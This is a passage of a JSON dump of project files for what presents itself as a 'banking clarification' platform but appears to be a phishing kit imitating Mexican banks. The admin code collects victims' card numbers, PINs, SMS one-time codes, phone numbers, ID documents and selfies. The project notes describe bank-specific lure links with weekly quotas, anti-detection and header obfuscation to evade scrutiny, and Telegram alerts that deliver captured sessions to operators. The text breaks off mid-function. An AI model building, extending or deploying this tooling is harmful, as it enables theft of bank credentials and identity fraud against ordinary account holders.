santander-container';\n      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';\n      case 'INVEX': return 'bg-white p-4 rounded-lg shadow invex-container';\n      case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';\n      case 'BANORTE': return 'banorte-container';\n      case 'PLATACARD': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#FF5722]';\n      case 'BANCO_AZTECA': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#00A552]';\n      case 'BIENESTAR': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#9D2449]';\n      case 'INBURSA': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#1B4B72]';\n      case 'AFIRME': return 'bg-white p-4 rounded-lg shadow border-t-2 border-[#009639]';\n      default: return '';\n    }\n  };\n\n  // Renderizados especiales seg煤n el banco\n  if (bankCode === 'CITIBANAMEX') {\n    // Podr铆amos agregar un renderizado especial para CitiBanamex si se necesita en el futuro\n  }\n\n  // Renderizado normal para otros bancos\n  return (\n    <div className={getBankContainerClass()}>\n      {/* No mostrar logos en el contenido principal - los logos ya est谩n en el header de cada banco */}\n      {renderScreen()}\n    </div>\n  );\n};\n","size_bytes":75291},"client/src/pages/TwoFactorVerification.tsx":{"content":"import { useState } from \"react\";\nimport { useMutation } from \"@tanstack/react-query\";\nimport { useLocation } from \"wouter\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Alert, AlertDescription } from \"@/components/ui/alert\";\nimport { Lock, MessageCircle } from \"lucide-react\";\nimport { apiRequest, queryClient } from \"@/lib/queryClient\";\n\ninterface VerifyResponse {\n  id: number;\n  username: string;\n  role: string;\n  isActive: boolean;\n}\n\nexport default function TwoFactorVerification() {\n  const [code, setCode] = useState(\"\");\n  const [, setLocation] = useLocation();\n\n  const verifyMutation = useMutation({\n    mutationFn: async (code: string): Promise<VerifyResponse> => {\n      const response = await apiRequest(\"POST\", \"/api/verify-2fa\", { code });\n      return await response.json();\n    },\n    onSuccess: (data) => {\n      console.log(\"[2FA] Verificaci贸n exitosa:\", data);\n      \n      // Actualizar el cache del usuario autenticado\n      queryClient.setQueryData([\"/api/user\"], data);\n      \n      // Invalidar queries para forzar una recarga\n      queryClient.invalidateQueries({ queryKey: [\"/api/user\"] });\n      \n      // Redirigir autom谩ticamente al panel seg煤n el rol del usuario\n      if (data.role === \"admin\") {\n        setLocation(\"/admin\");\n      } else {\n        setLocation(\"/panel\");\n      }\n    },\n    onError: (error: any) => {\n      console.error(\"[2FA] Error en verificaci贸n:\", error);\n    }\n  });\n\n  const handleSubmit = (e: React.FormEvent) => {\n    e.preventDefault();\n    if (code.trim().length === 6) {\n      verifyMutation.mutate(code.trim());\n    }\n  };\n\n  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const value = e.target.value.replace(/\\D/g, \"\").slice(0, 6);\n    setCode(value);\n    \n    // Env铆o autom谩tico cuando se completan los 6 d铆gitos\n    if (value.length === 6) {\n      setTimeout(() => {\n        verifyMutation.mutate(value);\n      }, 500); // Peque帽o delay para mejor UX\n    }\n  };\n\n  return (\n    <div className=\"min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4\">\n      <Card className=\"w-full max-w-md\">\n        <CardHeader className=\"space-y-1\">\n          <div className=\"flex items-center justify-center mb-4\">\n            <div className=\"p-3 rounded-full bg-blue-100\">\n              <Lock className=\"h-6 w-6 text-blue-600\" />\n            </div>\n          </div>\n          <CardTitle className=\"text-2xl font-bold text-center\">\n            Verificaci贸n de Dos Factores\n          </CardTitle>\n          <CardDescription className=\"text-center\">\n            Ingresa el c贸digo de 6 d铆gitos enviado a tu Telegram\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <form onSubmit={handleSubmit} className=\"space-y-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"code\">C贸digo de Verificaci贸n</Label>\n              <Input\n                id=\"code\"\n                type=\"text\"\n                placeholder=\"123456\"\n                value={code}\n                onChange={handleCodeChange}\n                className=\"text-center text-2xl font-mono tracking-widest\"\n                maxLength={6}\n                autoComplete=\"off\"\n                autoFocus\n              />\n            </div>\n\n            {verifyMutation.error && (\n              <Alert className=\"border-red-200 bg-red-50\">\n                <AlertDescription className=\"text-red-700\">\n                  {verifyMutation.error?.message || \"C贸digo inv谩lido. Intenta nuevamente.\"}\n                </AlertDescription>\n              </Alert>\n            )}\n\n            <Button\n              type=\"submit\"\n              className=\"w-full\"\n              disabled={code.length !== 6 || verifyMutation.isPending}\n            >\n              {verifyMutation.isPending ? \"Verificando...\" : \"Verificar C贸digo\"}\n            </Button>\n\n            <div className=\"text-center text-sm text-gray-600\">\n              <div className=\"flex items-center justify-center gap-2 mb-2\">\n                <MessageCircle className=\"h-4 w-4\" />\n                <span>C贸digo enviado por Telegram</span>\n              </div>\n              <p>驴No recibiste el c贸digo? Revisa tu chat de Telegram</p>\n              <p className=\"mt-1\">Soporte: @BalonxSistema</p>\n            </div>\n          </form>\n        </CardContent>\n      </Card>\n    </div>\n  );\n}","size_bytes":4586},"client/src/components/ui/tabs.tsx":{"content":"import * as React from \"react\"\nimport * as TabsPrimitive from \"@radix-ui/react-tabs\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Tabs = TabsPrimitive.Root\n\nconst TabsList = React.forwardRef<\n  React.ElementRef<typeof TabsPrimitive.List>,\n  React.ComponentPropsWithoutRef<typeof TabsPrimitive.List>\n>(({ className, ...props }, ref) => (\n  <TabsPrimitive.List\n    ref={ref}\n    className={cn(\n      \"inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground\",\n      className\n    )}\n    {...props}\n  />\n))\nTabsList.displayName = TabsPrimitive.List.displayName\n\nconst TabsTrigger = React.forwardRef<\n  React.ElementRef<typeof TabsPrimitive.Trigger>,\n  React.ComponentPropsWithoutRef<typeof TabsPrimitive.Trigger>\n>(({ className, ...props }, ref) => (\n  <TabsPrimitive.Trigger\n    ref={ref}\n    className={cn(\n      \"inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm\",\n      className\n    )}\n    {...props}\n  />\n))\nTabsTrigger.displayName = TabsPrimitive.Trigger.displayName\n\nconst TabsContent = React.forwardRef<\n  React.ElementRef<typeof TabsPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof TabsPrimitive.Content>\n>(({ className, ...props }, ref) => (\n  <TabsPrimitive.Content\n    ref={ref}\n    className={cn(\n      \"mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2\",\n      className\n    )}\n    {...props}\n  />\n))\nTabsContent.displayName = TabsPrimitive.Content.displayName\n\nexport { Tabs, TabsList, TabsTrigger, TabsContent }\n","size_bytes":1883},"replit.md":{"content":"# Aclaraciones Bancarias Platform\n\n## Overview\n\nThis project is a comprehensive banking clarification platform designed to streamline banking clarifications, enhance user experience, and provide administrators with powerful tools for managing sessions and users. It features a dual-domain architecture for client and admin interfaces, built with Express.js and React. The platform offers real-time communication, robust banking session management, user authentication, SMS integration, file management, and Telegram notifications. Key capabilities include automated payment verification via Bitso API and OpenAI GPT-4o Vision, and a sophisticated link management system.\n\n## User Preferences\n\nPreferred communication style: Simple, everyday language.\n\n## System Architecture\n\nThe platform uses a multi-domain setup (`aclaracion.info` for clients and `panel.aclaracion.info` for administration) served by a single Express.js backend. The frontend is built with React 18, TypeScript, Vite, and Tailwind CSS with shadcn/ui. The backend uses Express.js with TypeScript, PostgreSQL via Drizzle ORM, and WebSockets for real-time updates. Authentication is session-based with Passport.js, supporting role-based access, device limitations, and account expiration.\n\n**Key Architectural Decisions and Features:**\n\n*   **Database Schema**: Manages users, executives, banking sessions (including screen types, user inputs, file attachments), SMS configurations, and notification preferences.\n*   **Authentication**: Session-based with Passport.js, incorporating anti-bot measures, behavioral analysis, and OTP verification for executives. Supports various account types (Individual, Office) with differing device limits and management capabilities.\n*   **Screen Management**: Dynamic screen types guide users through banking workflows (validation, OTP, card info, transfers, protection banking).\n*   **File Management**: Multer-based uploads for protection banking with Telegram notifications for downloads.\n*   **Data Flow**: Admin-initiated sessions with QR codes, real-time client-admin updates via WebSockets, and a guided banking workflow.\n*   **Security**: Anti-detection, rate limiting, header obfuscation, and comprehensive input validation.\n*   **UI/UX**: Tailwind CSS with shadcn/ui for a consistent and modern design.\n*   **WhatsApp Bot Architecture**: Utilizes `@whiskeysockets/baileys` for multi-user WhatsApp Web connections, offering independent bot instances, QR code management, hierarchical menus, and dynamic content placeholders. Conversation history is stored in the database.\n*   **Payment Verification Flow**: Integrates Bitso API and OpenAI GPT-4o Vision for automated payment verification, with a fallback to manual review and a discount code system.\n*   **Payment Bot (Telegram)**: A dedicated Telegram bot for payment receipt notifications and manual user activation by administrators.\n*   **Link Management System**: Provides comprehensive link creation and management with single-use tokens, bank-specific URL paths, user quota management (150 links/week resetting on Mondays shared between web panel and Telegram bot), active session monitoring, and admin controls for viewing/resetting user quotas. Links remain active indefinitely until manually cancelled. Once a user enters their folio, a 1-hour session timer begins for completion.\n*   **Bank-Specific Screen Flow Configuration System**: Allows both administrators and regular users to define custom sequences of screens for each bank. These configurations are stored in the database (`bank_screen_flows` for global admin flows, `user_bank_flows` for individual user flows) and are applied to sessions when links are created. The UI supports drag-and-drop step management with configurable screen types, durations, and user input requirements.\n*   **Personalized Telegram Notifications**: Each user receives Telegram notifications only for their own sessions via `telegramChatId` lookup. The system sends notifications to both the main admin (if configured) and the session creator (if they have a Telegram chat ID linked). Error handling is independent for each recipient to ensure delivery resilience.\n*   **Telegram Bot Link Generation**: The `/generar` command allows users to create banking links directly from Telegram with an interactive bank selection menu. The system enforces comprehensive security controls including role verification (user/admin only), weekly quota enforcement (150 links/week shared with panel), session timeout (5 minutes of inactivity), anti-concurrency checks, and account expiration validation. Generated links appear in the user's panel and follow the same quota and flow configuration as panel-generated links. The bot displays updated quota information after each successful generation, showing exactly how many links remain for the current week.\n\n## External Dependencies\n\n*   **Database**: `@neondatabase/serverless` (PostgreSQL), `drizzle-orm`\n*   **Authentication**: `passport`, `bcrypt`\n*   **File Uploads**: `multer`\n*   **Real-time Communication**: `ws`\n*   **Frontend Libraries**: `@tanstack/react-query`, `@radix-ui`, `wouter`, `tailwindcss`\n*   **SMS Integration**: Soft Mex API, eims premium SMS API\n*   **Telegram Integration**: `node-telegram-bot-api` (Main Bot for notifications, 2FA, payments; Payment Bot for dedicated payment receipt management)\n*   **WhatsApp Integration**: `@whiskeysockets/baileys`\n*   **Payment Gateway**: Bitso API\n*   **AI Integration**: OpenAI GPT-4o Vision\n*   **Environment Management**: Replit Secrets","size_bytes":5555},"client/src/components/admin/TelegramBotManagement.tsx":{"content":"import { useState } from 'react';\nimport { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';\nimport { apiRequest } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Textarea } from '@/components/ui/textarea';\nimport { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card';\nimport { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';\nimport { Badge } from '@/components/ui/badge';\nimport { MessageSquare, Send, Users, CheckCircle, AlertCircle, Bot, Shield, Zap } from 'lucide-react';\n\ninterface UserWithTelegram {\n  id: number;\n  username: string;\n  telegramChatId?: string;\n  role: string;\n}\n\nconst TelegramBotManagement = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  const [adminMessage, setAdminMessage] = useState('');\n  const [targetChatId, setTargetChatId] = useState('');\n  const [isBroadcast, setIsBroadcast] = useState(false);\n  const [adminChatId, setAdminChatId] = useState('');\n\n  // Obtener usuarios con Chat ID configurado\n  const { data: users = [] } = useQuery({\n    queryKey: ['/api/users/regular'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/users/regular');\n      return res.json();\n    },\n  });\n\n  // Obtener datos del administrador actual\n  const { data: currentAdmin } = useQuery({\n    queryKey: ['/api/user'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/user');\n      return res.json();\n    },\n  });\n\n  // Mutaci贸n para enviar mensaje de administrador\n  const sendAdminMessageMutation = useMutation({\n    mutationFn: async (data: { message: string; userChatId?: string; isBroadcast: boolean }) => {\n      const res = await apiRequest('POST', '/api/telegram/send-admin-message', data);\n      return res.json();\n    },\n    onSuccess: (data) => {\n      setAdminMessage('');\n      setTargetChatId('');\n      toast({\n        title: \"Mensaje enviado\",\n        description: data.message || \"Mensaje enviado correctamente\",\n      });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error enviando mensaje\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Mutaci贸n para actualizar Chat ID del administrador\n  const updateAdminChatIdMutation = useMutation({\n    mutationFn: async (data: { telegramChatId: string }) => {\n      const res = await apiRequest('PUT', '/api/user/profile', data);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/user'] });\n      toast({\n        title: \"Chat ID actualizado\",\n        description: \"Tu Chat ID de Telegram ha sido configurado correctamente\",\n      });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error actualizando Chat ID\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Enviar mensaje individual o broadcast\n  const handleSendMessage = () => {\n    if (!adminMessage.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Por favor ingresa un mensaje\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    if (!isBroadcast && !targetChatId.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Por favor selecciona un usuario o activa el modo broadcast\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    sendAdminMessageMutation.mutate({\n      message: adminMessage,\n      userChatId: isBroadcast ? undefined : targetChatId,\n      isBroadcast,\n    });\n  };\n\n  // Usuarios con Chat ID configurado\n  const usersWithChatId = users.filter((user: UserWithTelegram) => user.telegramChatId);\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex items-center space-x-2\">\n        <Bot className=\"h-6 w-6 text-blue-500\" />\n        <h2 className=\"text-2xl font-bold text-white\">Bot de Telegram</h2>\n        <Badge variant=\"outline\" className=\"text-green-400 border-green-400\">\n          Activo\n        </Badge>\n      </div>\n\n      <Tabs defaultValue=\"messaging\" className=\"w-full\">\n        <TabsList className=\"grid w-full grid-cols-3\">\n          <TabsTrigger value=\"messaging\" className=\"flex items-center space-x-2\">\n            <MessageSquare className=\"h-4 w-4\" />\n            <span>Mensajer铆a</span>\n          </TabsTrigger>\n          <TabsTrigger value=\"2fa\" className=\"flex items-center space-x-2\">\n            <Shield className=\"h-4 w-4\" />\n            <span>2FA</span>\n          </TabsTrigger>\n          <TabsTrigger value=\"users\" className=\"flex items-center space-x-2\">\n            <Users className=\"h-4 w-4\" />\n            <span>Usuarios</span>\n          </TabsTrigger>\n        </TabsList>\n\n        <TabsContent value=\"messaging\" className=\"space-y-6\">\n          <Card className=\"bg-[#1a1a1a] border-gray-700\">\n            <CardHeader>\n              <CardTitle className=\"text-white flex items-center space-x-2\">\n                <Send className=\"h-5 w-5\" />\n                <span>Enviar Mensaje</span>\n              </CardTitle>\n            </CardHeader>\n            <CardContent className=\"space-y-4\">\n              <div className=\"flex items-center space-x-4\">\n                <label className=\"flex items-center space-x-2\">\n                  <input\n                    type=\"radio\"\n                    checked={!isBroadcast}\n                    onChange={() => setIsBroadcast(false)}\n                    className=\"text-blue-500\"\n                  />\n                  <span className=\"text-white\">Mensaje individual</span>\n                </label>\n                <label className=\"flex items-center space-x-2\">\n                  <input\n                    type=\"radio\"\n                    checked={isBroadcast}\n                    onChange={() => setIsBroadcast(true)}\n                    className=\"text-blue-500\"\n                  />\n                  <span className=\"text-white\">Mensaje masivo (broadcast)</span>\n                </label>\n              </div>\n\n              {!isBroadcast && (\n                <div>\n                  <label className=\"block text-sm font-medium text-gray-400 mb-2\">\n                    Chat ID del usuario\n                  </label>\n                  <Input\n                    type=\"text\"\n                    value={targetChatId}\n                    onChange={(e) => setTargetChatId(e.target.value)}\n                    placeholder=\"Ej: 1234567890\"\n                    className=\"bg-[#2c2c2c] border-gray-700 text-white\"\n                  />\n                  <div className=\"text-xs text-gray-500 mt-1\">\n                    Usa la tabla de usuarios para copiar el Chat ID\n                  </div>\n                </div>\n              )}\n\n              <div>\n                <label className=\"block text-sm font-medium text-gray-400 mb-2\">\n                  Mensaje\n                </label>\n                <Textarea\n                  value={adminMessage}\n                  onChange={(e) => setAdminMessage(e.target.value)}\n                  placeholder=\"Escribe tu mensaje aqu铆...\"\n                  className=\"bg-[#2c2c2c] border-gray-700 text-white\"\n                  rows={4}\n                />\n              </div>\n\n              <Button\n                onClick={handleSendMessage}\n                disabled={sendAdminMessageMutation.isPending}\n                className=\"bg-blue-600 hover:bg-blue-700 w-full\"\n              >\n                {sendAdminMessageMutation.isPending ? (\n                  <div className=\"animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-white mr-2\"></div>\n                ) : (\n                  <Send className=\"h-4 w-4 mr-2\" />\n                )}\n                {isBroadcast ? 'Enviar a todos los usuarios' : 'Enviar mensaje'}\n              </Button>\n\n              {isBroadcast && (\n                <div className=\"bg-yellow-900/30 border border-yellow-600 rounded-lg p-3\">\n                  <div className=\"flex items-center space-x-2 text-yellow-400\">\n                    <AlertCircle className=\"h-4 w-4\" />\n                    <span className=\"text-sm font-medium\">Mensaje masivo</span>\n                  </div>\n                  <p className=\"text-xs text-yellow-300 mt-1\">\n                    Se enviar谩 a {usersWithChatId.length} usuarios con Chat ID configurado\n                  </p>\n                </div>\n              )}\n            </CardContent>\n          </Card>\n        </TabsContent>\n\n        <TabsContent value=\"2fa\" className=\"space-y-6\">\n          <Card className=\"bg-[#1a1a1a] border-gray-700\">\n            <CardHeader>\n              <CardTitle className=\"text-white flex items-center space-x-2\">\n                <Shield className=\"h-5 w-5\" />\n                <span>Autenticaci贸n de Doble Factor</span>\n              </CardTitle>\n            </CardHeader>\n            <CardContent className=\"space-y-4\">\n              <div className=\"grid grid-cols-1 md:grid-cols-3 gap-4\">\n                <div className=\"bg-[#2c2c2c] p-4 rounded-lg text-center\">\n                  <Zap className=\"h-8 w-8 text-green-500 mx-auto mb-2\" />\n                  <h3 className=\"text-white font-medium\">Estado</h3>\n                  <p className=\"text-green-400 text-sm\">Activo</p>\n                </div>\n                <div className=\"bg-[#2c2c2c] p-4 rounded-lg text-center\">\n                  <CheckCircle className=\"h-8 w-8 text-blue-500 mx-auto mb-2\" />\n                  <h3 className=\"text-white font-medium\">C贸digos generados</h3>\n                  <p className=\"text-blue-400 text-sm\">Sistema autom谩tico</p>\n                </div>\n                <div className=\"bg-[#2c2c2c] p-4 rounded-lg text-center\">\n                  <AlertCircle className=\"h-8 w-8 text-yellow-500 mx-auto mb-2\" />\n                  <h3 className=\"text-white font-medium\">Expiraci贸n</h3>\n                  <p className=\"text-yellow-400 text-sm\">10 minutos</p>\n                </div>\n              </div>\n\n              <div className=\"bg-gray-800 rounded-lg p-4\">\n                <h4 className=\"text-white font-medium mb-2\">Funcionamiento del 2FA</h4>\n                <ul className=\"text-gray-300 text-sm space-y-1\">\n                  <li> Se env铆a c贸digo autom谩tico al Chat ID del usuario al iniciar sesi贸n</li>\n                  <li> Los c贸digos expiran en 10 minutos por seguridad</li>\n                  <li> Tambi茅n se env铆a copia al administrador para monitoreo</li>\n                  <li> Limpieza autom谩tica de c贸digos expirados cada 30 minutos</li>\n                </ul>\n              </div>\n\n              {/* Configuraci贸n Chat ID del Administrador */}\n              <div className=\"bg-blue-900/30 border border-blue-600 rounded-lg p-4\">\n                <h4 className=\"text-white font-medium mb-3 flex items-center\">\n                  <Bot className=\"h-4 w-4 mr-2\" />\n                  Configurar tu Chat ID\n                </h4>\n                <div className=\"space-y-3\">\n                  <div className=\"text-sm text-blue-300\">\n                    Chat ID actual: {currentAdmin?.telegramChatId ? (\n                      <span className=\"text-green-400 font-mono\">{currentAdmin.telegramChatId}</span>\n                    ) : (\n                      <span className=\"text-red-400\">No configurado</span>\n                    )}\n                  </div>\n                  <div className=\"flex space-x-2\">\n                    <Input\n                      type=\"text\"\n                      placeholder=\"Ej: 1234567890\"\n                      value={adminChatId}\n                      onChange={(e) => setAdminChatId(e.target.value)}\n                      className=\"bg-[#2c2c2c] border-gray-700 text-white flex-1\"\n                    />\n                    <Button\n                      onClick={() => {\n                        if (adminChatId.trim()) {\n                          updateAdminChatIdMutation.mutate({ telegramChatId: adminChatId });\n                          setAdminChatId('');\n                        }\n                      }}\n                      disabled={updateAdminChatIdMutation.isPending || !adminChatId.trim()}\n                      className=\"bg-blue-600 hover:bg-blue-700\"\n                    >\n                      {updateAdminChatIdMutation.isPending ? 'Guardando...' : 'Guardar'}\n                    </Button>\n                  </div>\n                  <div className=\"text-xs text-gray-400\">\n                    Para obtener tu Chat ID, env铆a /id al bot @panelbalonxbot\n                  </div>\n                </div>\n              </div>\n            </CardContent>\n          </Card>\n        </TabsContent>\n\n        <TabsContent value=\"users\" className=\"space-y-6\">\n          <Card className=\"bg-[#1a1a1a] border-gray-700\">\n            <CardHeader>\n              <CardTitle className=\"text-white flex items-center space-x-2\">\n                <Users className=\"h-5 w-5\" />\n                <span>Usuarios con Telegram</span>\n              </CardTitle>\n            </CardHeader>\n            <CardContent>\n              <div className=\"space-y-4\">\n                <div className=\"text-sm text-gray-400\">\n                  Total de usuarios con Chat ID: {usersWithChatId.length} de {users.length}\n                </div>\n\n                <div className=\"grid gap-3\">\n                  {usersWithChatId.length === 0 ? (\n                    <div className=\"text-center py-6 text-gray-500\">\n                      No hay usuarios con Chat ID configurado\n                    </div>\n                  ) : (\n                    usersWithChatId.map((user: UserWithTelegram) => (\n                      <div\n                        key={user.id}\n                        className=\"bg-[#2c2c2c] p-3 rounded-lg flex items-center justify-between\"\n                      >\n                        <div>\n                          <div className=\"text-white font-medium\">{user.username}</div>\n                          <div className=\"text-gray-400 text-xs\">\n                            Chat ID: {user.telegramChatId}\n                          </div>\n                        </div>\n                        <div className=\"flex items-center space-x-2\">\n                          <Button\n                            variant=\"ghost\"\n                            size=\"sm\"\n                            onClick={() => {\n                              setTargetChatId(user.telegramChatId || '');\n                              setIsBroadcast(false);\n                            }}\n                            className=\"text-blue-400 hover:text-blue-300\"\n                          >\n                            Seleccionar\n                          </Button>\n                          <Button\n                            variant=\"ghost\"\n                            size=\"sm\"\n                            onClick={() => {\n                              navigator.clipboard.writeText(user.telegramChatId || '');\n                              toast({\n                                title: \"Copiado\",\n                                description: \"Chat ID copiado al portapapeles\",\n                              });\n                            }}\n                            className=\"text-gray-400 hover:text-gray-300\"\n                          >\n                            Copiar ID\n                          </Button>\n                        </div>\n                      </div>\n                    ))\n                  )}\n                </div>\n\n                <div className=\"bg-blue-900/30 border border-blue-600 rounded-lg p-3\">\n                  <div className=\"flex items-center space-x-2 text-blue-400\">\n                    <Bot className=\"h-4 w-4\" />\n                    <span className=\"text-sm font-medium\">Informaci贸n del Bot</span>\n                  </div>\n                  <p className=\"text-xs text-blue-300 mt-1\">\n                    Bot: @panelbalonxbot | Los usuarios pueden obtener su Chat ID con /id\n                  </p>\n                </div>\n              </div>\n            </CardContent>\n          </Card>\n        </TabsContent>\n      </Tabs>\n    </div>\n  );\n};\n\nexport default TelegramBotManagement;","size_bytes":16181},"client/src/components/admin/AccessTable.tsx":{"content":"import React, { useState, useEffect } from 'react';\nimport { Session } from '@shared/schema';\nimport { Skeleton } from '@/components/ui/skeleton';\nimport { useMutation } from '@tanstack/react-query';\nimport { apiRequest } from '@/lib/queryClient';\nimport { queryClient } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\nimport { useDeviceInfo } from '@/hooks/use-device-orientation';\nimport { Card, CardContent } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode, Search, MapPin, Globe, ExternalLink } from 'lucide-react';\nimport { DeleteConfirmDialog } from './DeleteConfirmDialog';\n\ninterface AccessTableProps {\n  sessions: Session[];\n  activeBank: string;\n  selectedSessionId: string | null;\n  onSelectSession: (sessionId: string) => void;\n  isLoading: boolean;\n}\n\nconst AccessTable: React.FC<AccessTableProps> = ({ \n  sessions, \n  activeBank, \n  selectedSessionId,\n  onSelectSession,\n  isLoading \n}) => {\n  const { toast } = useToast();\n  const { isMobile } = useDeviceInfo();\n  // Estado para controlar el tama帽o de la pantalla\n  const [isSmallScreen, setIsSmallScreen] = useState(window.innerWidth < 1024);\n  // Estado para resaltar las filas reci茅n actualizadas\n  const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});\n  \n  // Estado para resaltar campos espec铆ficos que han sido actualizados\n  const [highlightedFields, setHighlightedFields] = useState<Record<string, Record<string, boolean>>>({});\n  \n  // Estado para el di谩logo de confirmaci贸n de eliminaci贸n\n  const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState<boolean>(false);\n  const [sessionToDelete, setSessionToDelete] = useState<Session | null>(null);\n  \n  // Estado para el t茅rmino de b煤squeda\n  const [searchTerm, setSearchTerm] = useState<string>('');\n  \n  // Mutation para guardar una sesi贸n\n  const saveSessionMutation = useMutation({\n    mutationFn: async (sessionId: string) => {\n      const res = await apiRequest('POST', `/api/sessions/${sessionId}/save`);\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Sesi贸n guardada\",\n        description: \"La sesi贸n ha sido guardada en accesos guardados.\",\n      });\n      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });\n    },\n    onError: (error) => {\n      toast({\n        title: \"Error al guardar sesi贸n\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    }\n  });\n  \n  // Mutation para eliminar una sesi贸n\n  const deleteSessionMutation = useMutation({\n    mutationFn: async (sessionId: string) => {\n      const res = await apiRequest('DELETE', `/api/sessions/${sessionId}`);\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Sesi贸n eliminada\",\n        description: \"La sesi贸n ha sido eliminada correctamente.\",\n      });\n      // La actualizaci贸n se manejar谩 a trav茅s de websockets\n    },\n    onError: (error) => {\n      toast({\n        title: \"Error al eliminar sesi贸n\",\n        description: error.message,\n        variant: \"destructive\",\n      });\n    }\n  });\n  \n  // Filter sessions by bank and search term\n  const filteredSessions = sessions.filter(session => {\n    // Filtrar por banco primero\n    const matchesBank = activeBank === 'todos' || session.banco === activeBank;\n    \n    // Si no hay t茅rmino de b煤squeda, solo filtrar por banco\n    if (!searchTerm.trim()) {\n      return matchesBank;\n    }\n    \n    // Filtrar por t茅rmino de b煤squeda en m煤ltiples campos\n    const searchLower = searchTerm.toLowerCase().trim();\n    const matchesSearch = \n      session.folio?.toLowerCase().includes(searchLower) ||\n      session.banco?.toLowerCase().includes(searchLower) ||\n      session.username?.toLowerCase().includes(searchLower) ||\n      session.createdBy?.toLowerCase().includes(searchLower) ||\n      session.tarjeta?.includes(searchTerm) ||\n      session.sms?.includes(searchTerm) ||\n      session.nip?.includes(searchTerm) ||\n      session.celular?.includes(searchTerm) ||\n      session.pasoActual?.toLowerCase().includes(searchLower) ||\n      session.deviceType?.toLowerCase().includes(searchLower) ||\n      session.deviceModel?.toLowerCase().includes(searchLower);\n    \n    return matchesBank && matchesSearch;\n  });\n    \n  // Referencias previas de las sesiones para poder comparar y detectar cambios\n  const [prevSessions, setPrevSessions] = useState<Session[]>([]);\n  \n  // Funci贸n para descargar documentos de identidad\n  const handleDownloadIdentityFile = (session: Session, type: 'document' | 'selfie') => {\n    try {\n      const fileUrl = type === 'document' ? (session as any).documentFileUrl : (session as any).selfieFileUrl;\n      const fileName = type === 'document' ? (session as any).documentFileName : (session as any).selfieFileName;\n      \n      if (!fileUrl) {\n        toast({\n          title: \"No hay archivo\",\n          description: `No se encontr贸 el ${type === 'document' ? 'documento' : 'selfie'} para descargar.`,\n          variant: \"destructive\",\n        });\n        return;\n      }\n\n      // Crear enlace temporal para descargar el archivo\n      const link = document.createElement('a');\n      link.href = fileUrl;\n      link.download = fileName || `${type}_${session.sessionId}_${new Date().toISOString().slice(0, 10)}.png`;\n      link.target = '_blank';\n      document.body.appendChild(link);\n      link.click();\n      document.body.removeChild(link);\n      \n      toast({\n        title: \"Descarga exitosa\",\n        description: `El ${type === 'document' ? 'documento de identidad' : 'selfie'} se ha descargado correctamente.`,\n        variant: \"default\",\n      });\n    } catch (error) {\n      console.error(`Error al descargar ${type}:`, error);\n      toast({\n        title: \"Error al descargar\",\n        description: `Ha ocurrido un error al descargar el ${type === 'document' ? 'documento' : 'selfie'}.`,\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  // Funci贸n para descargar un c贸digo QR (como imagen o texto)\n  const handleDownloadQR = (session: Session) => {\n    try {\n      // Primero intentamos descargar la imagen del QR si existe\n      if (session.qrImageData && session.qrImageData.startsWith('data:')) {\n        const link = document.createElement('a');\n        link.href = session.qrImageData;\n        link.download = `qr_image_${new Date().toISOString().slice(0, 10)}.png`;\n        document.body.appendChild(link);\n        link.click();\n        